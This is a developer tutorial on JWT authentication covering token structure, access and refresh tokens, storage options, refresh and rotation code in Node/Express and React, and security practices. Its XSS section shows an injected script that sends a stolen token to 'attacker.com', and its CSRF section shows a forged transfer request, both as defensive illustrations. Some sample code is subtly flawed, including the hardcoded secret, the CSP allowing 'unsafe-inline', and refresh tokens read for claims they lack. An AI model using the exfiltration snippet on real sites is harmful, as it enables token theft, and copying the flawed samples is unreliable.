# JWT Authentication: A Comprehensive Guide to Modern Authentication

> **For developers who want to deeply understand JWT and implement secure authentication**

User authentication is the foundation of every modern web application. But how do you authenticate securely, scalably, and effectively in distributed systems? JSON Web Token (JWT) has become the most popular solution to this problem. In this article, we'll dive deep into JWT from basic concepts to security best practices.

## Part 1: What is JWT?

### 1.1 Definition and Structure

JSON Web Token (JWT) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. JWT is designed to be compact, self-contained, and verifiable for integrity.

A JWT token consists of 3 parts, separated by dots (`.`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Structure:**

```
HEADER.PAYLOAD.SIGNATURE
```

#### Header

Contains information about the token type and encryption algorithm:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Payload

Contains claims (information about the user and metadata):

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}
```

#### Signature

Created by encoding the header and payload with a secret key:

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

### 1.2 Why is JWT Popular?

JWT solves many problems of traditional authentication methods (session-based):

| Criteria            | Session-Based                              | JWT-Based                                 |
| :------------------ | :----------------------------------------- | :---------------------------------------- |
| **Server storage**  | Requires session storage                   | No storage needed (stateless)             |
| **Scalability**     | Hard to scale (needs shared session store) | Easy to scale (each server self-verifies) |
| **Cross-domain**    | Difficult (CORS issues)                    | Easy (token in header)                    |
| **Mobile-friendly** | Complex with native apps                   | Simple, just send token                   |
| **Microservices**   | Needs shared session store                 | Each service self-verifies                |

**Real-world example:**

```javascript
// Client sends login request
const response = await fetch("/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
});

const { accessToken } = await response.json();

// Then client uses token for requests
const data = await fetch("/api/protected-resource", {
  headers: {
    Authorization: `Bearer ${accessToken}`,
  },
});
```

The server doesn't need to store anything about the session. Every time it receives a request with JWT, the server just needs to verify the signature and read information from the payload.

---

## Part 2: Access Token vs Refresh Token

### 2.1 Why Do We Need Two Types of Tokens?

A common question: if JWT already contains all the information, why not use a single token?

**Problems with a single token:**

- If token has long expiry time (e.g., 30 days) → User doesn't need to login again but **high security risk** if token is stolen
- If token has short expiry time (e.g., 15 minutes) → **More secure** but user must login constantly → Bad UX

**Solution: Dual Token Strategy**

Use a combination of 2 token types with different purposes and lifecycles:

### 2.2 Access Token

**Characteristics:**

- **Short expiry time**: 5-15 minutes
- **Purpose**: Access protected resources (API endpoints)
- **Storage**: In memory (JavaScript variable) or sessionStorage
- **Risk**: Low because expires quickly

**Payload example:**

```json
{
  "sub": "user123",
  "role": "user",
  "permissions": ["read:posts", "write:comments"],
  "iat": 1710000000,
  "exp": 1710000900 // 15 minutes later
}
```

### 2.3 Refresh Token

**Characteristics:**

- **Long expiry time**: 7-30 days
- **Purpose**: Generate new access token when access token expires
- **Storage**: HttpOnly cookie (most secure)
- **Risk**: Higher but has preventive mechanisms (token rotation)

**Payload example:**

```json
{
  "sub": "user123",
  "tokenFamily": "abc123", // To detect reuse attacks
  "iat": 1710000000,
  "exp": 1712592000 // 30 days later
}
```

### 2.4 Detailed Comparison

| Feature         | Access Token               | Refresh Token               |
| :-------------- | :------------------------- | :-------------------------- |
| **Purpose**     | Access API                 | Renew access token          |
| **Expiry**      | Short (5-15 mins)          | Long (7-30 days)            |
| **Sent to**     | Every API request          | Only `/refresh` endpoint    |
| **Storage**     | Memory/sessionStorage      | HttpOnly cookie             |
| **Can revoke?** | No (expires automatically) | Yes (revoke list on server) |
| **Size**        | Larger (more claims)       | Smaller (fewer claims)      |

### 2.5 Complete Workflow

```
┌─────────────┐                          ┌─────────────┐
│   Client    │                          │   Server    │
└──────┬──────┘                          └──────┬──────┘
       │                                        │
       │  1. POST /login (email, password)     │
       │───────────────────────────────────────>│
       │                                        │
       │  2. Access Token + Refresh Token      │
       │      (Refresh via httpOnly cookie)    │
       │<───────────────────────────────────────│
       │                                        │
       │  3. GET /api/posts                    │
       │     Authorization: Bearer <access>    │
       │───────────────────────────────────────>│
       │                                        │
       │  4. Response data                     │
       │<───────────────────────────────────────│
       │                                        │
       │  [15 minutes later - access token expires] │
       │                                        │
       │  5. GET /api/posts                    │
       │     Authorization: Bearer <expired>   │
       │───────────────────────────────────────>│
       │                                        │
       │  6. 401 Unauthorized                  │
       │<───────────────────────────────────────│
       │                                        │
       │  7. POST /refresh                     │
       │     (Cookie: refresh_token automatic) │
       │───────────────────────────────────────>│
       │                                        │
       │  8. New Access Token                  │
       │<───────────────────────────────────────│
       │                                        │
       │  9. Retry GET /api/posts              │
       │     Authorization: Bearer <new_token> │
       │───────────────────────────────────────>│
       │                                        │
       │  10. Response data                    │
       │<───────────────────────────────────────│
```

---

## Part 3: Token Storage - Security Tradeoffs

### 3.1 The Most Important Question

**Where to store tokens?** This is a decision that directly impacts application security. There are 3 common options:

1. LocalStorage
2. SessionStorage
3. HttpOnly Cookies

Each method has its own security tradeoffs. No solution is 100% perfect.

### 3.2 Option 1: LocalStorage

**How it works:**

```javascript
// Store token
localStorage.setItem("accessToken", token);

// Read token
const token = localStorage.getItem("accessToken");

// Use it
fetch("/api/data", {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

**Advantages:**

- ✅ Simple, easy to implement
- ✅ Persists after closing browser (user doesn't need to login again)
- ✅ Can be accessed from JavaScript

**Disadvantages:**

- ❌ **Vulnerable to XSS attacks** (Cross-Site Scripting)
- ❌ Any script on the page can read it
- ❌ Doesn't auto expire when closing tab

**When to use:**

- Simple app, no user-generated content
- Strong XSS protection already in place
- Convenience more important than maximum security

### 3.3 Option 2: SessionStorage

**How it works:**

```javascript
// Like localStorage but clears when tab closes
sessionStorage.setItem("accessToken", token);
const token = sessionStorage.getItem("accessToken");
```

**Advantages:**

- ✅ Auto clears when closing tab/window
- ✅ Slightly better than localStorage (session-only)

**Disadvantages:**

- ❌ Still vulnerable to XSS attacks
- ❌ Worse UX (must login again for each new tab)
- ❌ Doesn't work with multi-tab scenarios

**When to use:**

- App requires higher security than localStorage
- Accept UX trade-off (re-login each session)

### 3.4 Option 3: HttpOnly Cookies (Recommended)

**How it works:**

```javascript
// Server-side: Set cookie on login
res.cookie("refreshToken", token, {
  httpOnly: true, // JavaScript CANNOT access
  secure: true, // Only send over HTTPS
  sameSite: "strict", // Prevent CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});

// Client-side: Cookie automatically sent with every request
// Developer doesn't need to do anything!
```

**Advantages:**

- ✅ **Cannot be accessed from JavaScript** → Immune to XSS
- ✅ Automatically sent with every request (no code needed)
- ✅ `sameSite` attribute prevents CSRF attacks
- ✅ Server controls expiry and revocation

**Disadvantages:**

- ❌ **Can still be vulnerable to CSRF attacks** if misconfigured
- ❌ Doesn't work with cross-domain requests (needs careful CORS setup)
- ❌ More complex with mobile apps and third-party clients

**When to use:**

- Production applications with high security requirements
- Web apps (not pure API servers)
- Control both frontend and backend

### 3.5 Best Practice: Hybrid Approach

**Best strategy:**

```
┌─────────────────────────────────────────┐
│         Dual Token Strategy             │
├─────────────────────────────────────────┤
│                                         │
│  Access Token (short-lived):           │
│  → Store in memory (JS variable)       │
│  → Or sessionStorage                   │
│  → Use for API requests                │
│                                         │
│  Refresh Token (long-lived):           │
│  → Store in httpOnly cookie            │
│  → Only send to /refresh endpoint      │
│  → Server can revoke                   │
│                                         │
└─────────────────────────────────────────┘
```

**Implementation:**

```javascript
// Client-side: Token management service
class TokenService {
  // Access token in memory (only exists during session)
  #accessToken = null;

  setAccessToken(token) {
    this.#accessToken = token;
  }

  getAccessToken() {
    return this.#accessToken;
  }

  clearAccessToken() {
    this.#accessToken = null;
  }

  // Refresh token is set by server via httpOnly cookie
  // Client doesn't need to manage it!
}

// Auto-refresh logic
async function fetchWithAuth(url, options = {}) {
  const accessToken = tokenService.getAccessToken();

  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: `Bearer ${accessToken}`,
    },
  });

  // If 401, try to refresh
  if (response.status === 401) {
    const newToken = await refreshAccessToken();
    tokenService.setAccessToken(newToken);

    // Retry request with new token
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${newToken}`,
      },
    });
  }

  return response;
}

async function refreshAccessToken() {
  // Refresh token automatically sent via cookie
  const response = await fetch("/api/refresh", {
    method: "POST",
    credentials: "include", // Send cookies
  });

  const { accessToken } = await response.json();
  return accessToken;
}
```

### 3.6 Security Comparison

| Storage Method      | XSS Protection | CSRF Protection | Best For        |
| :------------------ | :------------: | :-------------: | :-------------- |
| **localStorage**    | ❌ Vulnerable  |     ✅ Safe     | Simple apps     |
| **sessionStorage**  | ❌ Vulnerable  |     ✅ Safe     | Short sessions  |
| **httpOnly Cookie** |  ✅ Protected  | ⚠️ Needs config | Production apps |
| **Memory only**     |  ✅ Protected  |  ✅ Protected   | Access tokens   |
| **Hybrid**          |  ✅ Protected  |  ✅ Protected   | **Recommended** |

---

## Part 4: Token Refresh Flow - Detailed Implementation

### 4.1 Why Do We Need a Refresh Mechanism?

Suppose your access token expires after 15 minutes:

- **Without refresh:** User must login again after every 15 minutes → Bad UX
- **With refresh:** App automatically renews token, user is not interrupted

The refresh flow is the bridge between security (short-lived tokens) and UX (seamless authentication).

### 4.2 Basic Refresh Flow

**Step-by-step:**

```
1. User login
   ↓
2. Server creates access token (15 min) + refresh token (7 days)
   ↓
3. Client stores access token (memory)
   Server sets refresh token (httpOnly cookie)
   ↓
4. Client uses access token for all API requests
   ↓
5. Access token expires → API returns 401
   ↓
6. Client calls /refresh endpoint (automatically sends refresh token via cookie)
   ↓
7. Server verifies refresh token → creates new access token
   ↓
8. Client stores new access token and retries failed request
```

### 4.3 Server-Side Implementation

**Backend (Node.js + Express):**

```javascript
const express = require("express");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());
app.use(express.json());

// Secret keys (MUST store in environment variables!)
const ACCESS_SECRET = process.env.ACCESS_SECRET;
const REFRESH_SECRET = process.env.REFRESH_SECRET;

// Token storage (production: use Redis)
const refreshTokens = new Set();

// 1. Login endpoint
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  // Verify credentials (simplified)
  const user = await verifyCredentials(email, password);
  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Generate tokens
  const accessToken = jwt.sign(
    {
      sub: user.id,
      email: user.email,
      role: user.role,
    },
    ACCESS_SECRET,
    { expiresIn: "15m" },
  );

  const refreshToken = jwt.sign({ sub: user.id }, REFRESH_SECRET, {
    expiresIn: "7d",
  });

  // Store refresh token (production: Redis with expiry)
  refreshTokens.add(refreshToken);

  // Set refresh token in httpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });

  // Return access token in response body
  res.json({ accessToken });
});

// 2. Refresh endpoint
app.post("/api/refresh", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  // Verify refresh token is still valid
  if (!refreshTokens.has(refreshToken)) {
    return res.status(403).json({ error: "Invalid refresh token" });
  }

  try {
    // Verify JWT signature
    const payload = jwt.verify(refreshToken, REFRESH_SECRET);

    // Generate new access token
    const newAccessToken = jwt.sign(
      {
        sub: payload.sub,
        email: payload.email,
        role: payload.role,
      },
      ACCESS_SECRET,
      { expiresIn: "15m" },
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    return res.status(403).json({ error: "Invalid or expired token" });
  }
});

// 3. Protected endpoint example
app.get("/api/protected", verifyAccessToken, (req, res) => {
  res.json({
    message: "Protected data",
    user: req.user,
  });
});

// 4. Logout endpoint
app.post("/api/logout", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  // Remove from whitelist
  refreshTokens.delete(refreshToken);

  // Clear cookie
  res.clearCookie("refreshToken");

  res.json({ message: "Logged out" });
});

// Middleware to verify access token
function verifyAccessToken(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "No access token" });
  }

  const token = authHeader.substring(7);

  try {
    const payload = jwt.verify(token, ACCESS_SECRET);
    req.user = payload;
    next();
  } catch (error) {
    return res.status(401).json({ error: "Invalid or expired access token" });
  }
}
```

### 4.4 Client-Side Implementation

**Frontend (React with Axios):**

```javascript
import axios from "axios";

// Axios instance with interceptors
const api = axios.create({
  baseURL: "http://localhost:3000/api",
  withCredentials: true, // Send cookies
});

// Store access token in memory
let accessToken = null;

export function setAccessToken(token) {
  accessToken = token;
}

export function getAccessToken() {
  return accessToken;
}

// Request interceptor: automatically add Authorization header
api.interceptors.request.use(
  (config) => {
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error),
);

// Response interceptor: automatically refresh on 401
api.interceptors.response.use(
  (response) => response, // Success case: do nothing
  async (error) => {
    const originalRequest = error.config;

    // If 401 error and not retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Call refresh endpoint
        const response = await axios.post(
          "http://localhost:3000/api/refresh",
          {},
          { withCredentials: true },
        );

        const newAccessToken = response.data.accessToken;
        setAccessToken(newAccessToken);

        // Retry request with new token
        originalRequest.headers.Authorization = `Bearer ${newAccessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed → logout user
        setAccessToken(null);
        window.location.href = "/login";
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  },
);

// Login function
export async function login(email, password) {
  const response = await api.post("/login", { email, password });
  const { accessToken } = response.data;
  setAccessToken(accessToken);
  return response.data;
}

// Logout function
export async function logout() {
  await api.post("/logout");
  setAccessToken(null);
}

export default api;
```

**Usage in React components:**

```javascript
import React, { useEffect, useState } from "react";
import api from "./apiClient";

function Dashboard() {
  const [data, setData] = useState(null);

  useEffect(() => {
    // Call protected API - auto refresh if needed
    api
      .get("/protected")
      .then((res) => setData(res.data))
      .catch((err) => console.error(err));
  }, []);

  return <div>{data && <pre>{JSON.stringify(data, null, 2)}</pre>}</div>;
}
```

### 4.5 Advanced: Token Rotation

**Problem with basic refresh:**

If a refresh token is stolen, the attacker can use it to generate access tokens continuously until the refresh token expires (7-30 days).

**Solution: Refresh Token Rotation**

Each time refresh is called, the server:

1. Verifies old refresh token
2. Generates new access token
3. **Generates new refresh token** (replaces old token)
4. Revokes old refresh token

```javascript
// Server: refresh with rotation
app.post("/api/refresh", async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;

  if (!refreshTokens.has(oldRefreshToken)) {
    return res.status(403).json({ error: "Invalid refresh token" });
  }

  try {
    const payload = jwt.verify(oldRefreshToken, REFRESH_SECRET);

    // Generate NEW tokens
    const newAccessToken = jwt.sign(
      { sub: payload.sub, email: payload.email, role: payload.role },
      ACCESS_SECRET,
      { expiresIn: "15m" },
    );

    const newRefreshToken = jwt.sign({ sub: payload.sub }, REFRESH_SECRET, {
      expiresIn: "7d",
    });

    // Rotate: delete old, add new
    refreshTokens.delete(oldRefreshToken);
    refreshTokens.add(newRefreshToken);

    // Set new refresh token cookie
    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    return res.status(403).json({ error: "Invalid token" });
  }
});
```

**Benefits:**

- ✅ Reduces time window for token theft
- ✅ Detects reuse attacks (old token already revoked)
- ✅ Automatic cleanup of expired tokens

---

## Part 5: Security Concerns - What You Need to Know

### 5.1 XSS (Cross-Site Scripting) Attacks

**Threat scenario:**

Attacker injects malicious script into website:

```html
<!-- Example: comment section doesn't sanitize input -->
<script>
  // Steal token from localStorage
  const token = localStorage.getItem("accessToken");
  fetch("https://attacker.com/steal?token=" + token);
</script>
```

**Mitigation strategies:**

1. **Don't store sensitive tokens in localStorage**

   ```javascript
   // ❌ BAD
   localStorage.setItem("accessToken", token);

   // ✅ GOOD - use memory or httpOnly cookie
   let accessToken = null; // Memory variable
   ```

2. **Content Security Policy (CSP)**

   ```javascript
   // Server response headers
   app.use((req, res, next) => {
     res.setHeader(
       "Content-Security-Policy",
       "default-src 'self'; script-src 'self' 'unsafe-inline'",
     );
     next();
   });
   ```

3. **Sanitize user input**

   ```javascript
   import DOMPurify from "dompurify";

   // Before rendering user content
   const cleanHTML = DOMPurify.sanitize(userInput);
   ```

4. **HttpOnly cookies for refresh tokens**
   ```javascript
   res.cookie("refreshToken", token, {
     httpOnly: true, // JavaScript cannot access
     secure: true,
     sameSite: "strict",
   });
   ```

### 5.2 CSRF (Cross-Site Request Forgery) Attacks

**Threat scenario:**

User is logged into `yourbank.com`. Attacker sends email with link:

```html
<!-- Email: "Click here for free gift!" -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" />
```

Browser automatically sends user's cookies → Request is executed!

**Mitigation strategies:**

1. **SameSite Cookie Attribute**

   ```javascript
   res.cookie("refreshToken", token, {
     httpOnly: true,
     secure: true,
     sameSite: "strict", // Or 'lax'
   });
   ```

   | SameSite Value | Protection | Use Case                                          |
   | :------------- | :--------- | :------------------------------------------------ |
   | `strict`       | Strongest  | Cookie NOT sent with cross-site requests          |
   | `lax`          | Medium     | Cookie sent with top-level navigations (GET only) |
   | `none`         | Weakest    | Cookie sent with all requests (requires HTTPS)    |

2. **CSRF Token Pattern**

   ```javascript
   // Server: generate CSRF token
   const csrfToken = generateRandomToken();
   req.session.csrfToken = csrfToken;

   // Client: send token in header or form
   fetch("/api/transfer", {
     method: "POST",
     headers: {
       "X-CSRF-Token": csrfToken,
     },
     body: JSON.stringify({ to, amount }),
   });

   // Server: verify token
   function verifyCsrfToken(req, res, next) {
     const token = req.headers["x-csrf-token"];
     if (token !== req.session.csrfToken) {
       return res.status(403).json({ error: "Invalid CSRF token" });
     }
     next();
   }
   ```

3. **Double Submit Cookie Pattern**

   ```javascript
   // Simpler: no session storage needed
   // Server sets CSRF token in cookie (readable from JS)
   res.cookie("csrf-token", csrfToken, {
     httpOnly: false, // Client needs to read it
     secure: true,
     sameSite: "strict",
   });

   // Client reads from cookie and sends back in header
   const csrfToken = getCookie("csrf-token");
   fetch("/api/action", {
     headers: {
       "X-CSRF-Token": csrfToken,
     },
   });
   ```

### 5.3 JWT Security Best Practices

#### 5.3.1 Secret Key Management

```javascript
// ❌ NEVER hardcode secrets
const SECRET = "mySecretKey123";

// ✅ Use environment variables
const SECRET = process.env.JWT_SECRET;

// ✅ Use strong secrets (32+ characters, random)
// openssl rand -base64 32
const SECRET = "Xy7K9mP4vN2qW8tE6rA3sD5fG7hJ1kL4";
```

#### 5.3.2 Token Expiry Time

```javascript
// ❌ Access token too long
jwt.sign(payload, SECRET, { expiresIn: "30d" });

// ✅ Access token short
jwt.sign(payload, ACCESS_SECRET, { expiresIn: "15m" });

// ✅ Refresh token longer but with rotation
jwt.sign(payload, REFRESH_SECRET, { expiresIn: "7d" });
```

#### 5.3.3 Sensitive Data in Payload

```javascript
// ❌ NEVER store sensitive data
const payload = {
  userId: user.id,
  email: user.email,
  password: user.password, // ❌ DANGEROUS!
  creditCard: user.creditCard, // ❌ DANGEROUS!
  ssn: user.ssn, // ❌ DANGEROUS!
};

// ✅ Only store identifiers and public info
const payload = {
  sub: user.id, // User ID
  email: user.email, // Public info
  role: user.role, // Authorization info
  iat: Date.now(),
};
```

**Reason:** JWT can be easily decoded (base64):

```javascript
// Anyone can decode JWT
const [header, payload, signature] = token.split(".");
const decodedPayload = JSON.parse(atob(payload));
console.log(decodedPayload); // Everything is readable!
```

#### 5.3.4 Algorithm Confusion Attack

```javascript
// ❌ Don't verify algorithm
jwt.verify(token, SECRET);

// ✅ Specify algorithms explicitly
jwt.verify(token, SECRET, {
  algorithms: ["HS256"], // Only accept HS256
});

// ❌ NEVER use 'none' algorithm in production
// Attacker can create unsigned tokens
```

#### 5.3.5 Token Revocation Strategy

JWT is **stateless** → Cannot revoke a specific token. Solutions:

**Option 1: Blacklist** (Redis)

```javascript
// On logout or fraud detection
await redis.setex(`blacklist:${tokenId}`, TTL, "1");

// Verify middleware checks blacklist
async function verifyToken(req, res, next) {
  const token = extractToken(req);
  const payload = jwt.verify(token, SECRET);

  // Check blacklist
  const isBlacklisted = await redis.exists(`blacklist:${payload.jti}`);
  if (isBlacklisted) {
    return res.status(401).json({ error: "Token revoked" });
  }

  req.user = payload;
  next();
}
```

**Option 2: Whitelist** (for refresh tokens)

```javascript
// Only accept refresh tokens in whitelist
const validRefreshTokens = new Set();

// Add on login
validRefreshTokens.add(refreshToken);

// Check on refresh
if (!validRefreshTokens.has(refreshToken)) {
  return res.status(403).json({ error: "Invalid token" });
}

// Remove on logout
validRefreshTokens.delete(refreshToken);
```

**Option 3: Short expiry + refresh rotation**

- Access token short (5-15 min) → Expires quickly
- Refresh token has rotation → Old tokens automatically invalid

### 5.4 HTTPS is Mandatory

```javascript
// ❌ NEVER use JWT over HTTP
// Tokens can be intercepted in transit

// ✅ Force HTTPS in production
if (process.env.NODE_ENV === "production" && !req.secure) {
  return res.redirect("https://" + req.headers.host + req.url);
}

// ✅ Set secure flag for cookies
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true, // Only send over HTTPS
  sameSite: "strict",
});
```

### 5.5 Rate Limiting

```javascript
const rateLimit = require("express-rate-limit");

// Limit login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Max 5 requests
  message: "Too many login attempts, please try again later",
});

app.post("/api/login", loginLimiter, handleLogin);

// Limit refresh attempts
const refreshLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: "Too many refresh attempts",
});

app.post("/api/refresh", refreshLimiter, handleRefresh);
```

### 5.6 Security Checklist

Before deploying JWT authentication:

- [ ] Access tokens have short expiry (≤ 15 minutes)
- [ ] Refresh tokens use httpOnly cookies
- [ ] Secret keys stored in environment variables (not hardcoded)
- [ ] Secret keys are strong (32+ characters, random)
- [ ] HTTPS enforced in production
- [ ] sameSite='strict' for cookies
- [ ] CSRF protection enabled
- [ ] Content Security Policy headers configured
- [ ] User input is sanitized (prevent XSS)
- [ ] Rate limiting for login and refresh endpoints
- [ ] Token rotation implemented for refresh tokens
- [ ] Logging and monitoring for suspicious activities
- [ ] Sensitive data NOT stored in JWT payload
- [ ] Algorithm explicitly specified when verifying
- [ ] Blacklist/whitelist mechanism for revocation

---

## Conclusion

JWT authentication is a powerful tool but needs to be implemented carefully. Key takeaways:

**1. Dual Token Strategy**

- Short access token (15 minutes) in memory
- Long refresh token (7 days) in httpOnly cookie
- Combines both security and UX

**2. Storage Matters**

- **DON'T** store tokens in localStorage (XSS vulnerability)
- **DO** use httpOnly cookies for refresh tokens
- **DO** use memory variables for access tokens

**3. Refresh Flow**

- Auto-refresh when access token expires
- Token rotation to reduce risk
- Proper error handling and retry logic

**4. Security First**

- HTTPS mandatory
- Strong secrets in environment variables
- CSRF protection with sameSite cookies
- XSS protection with CSP and input sanitization
- Rate limiting for sensitive endpoints
- Token revocation strategy

**5. Production Checklist**

- Environment variables for secrets
- Short expiry times
- Proper cookie configuration
- HTTPS enforcement
- Monitoring and logging

JWT is not a silver bullet for every use case, but when implemented correctly with these best practices, it's a powerful, scalable, and secure authentication solution for modern web applications.

---

**Next Steps:**

- Implement JWT authentication in your project
- Set up proper testing for authentication flows
- Monitor security logs for suspicious activities
- Consider OAuth 2.0 for third-party integrations
- Explore alternative authentication methods (OAuth, SAML, WebAuthn)

**Resources:**

- [RFC 7519 - JWT Standard](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt.io - JWT Debugger](https://jwt.io/)
